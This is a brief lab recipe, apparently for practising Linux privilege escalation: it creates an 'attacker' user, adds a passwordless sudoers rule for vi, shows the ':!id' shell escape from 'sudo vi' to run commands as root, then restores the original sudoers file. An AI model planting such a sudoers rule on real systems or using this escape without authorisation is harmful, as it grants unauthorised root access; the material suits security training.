# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser attacker
echo "attacker ALL=(ALL) NOPASSWD: /usr/bin/vi" >> /etc/sudoers
```

# Exploit

```bash
sudo vi
:!id
```

# Clean Up

```bash
deluser attacker --remove-home
cp /etc/sudoers.bak /etc/sudoers
```

# references

https://gtfobins.github.io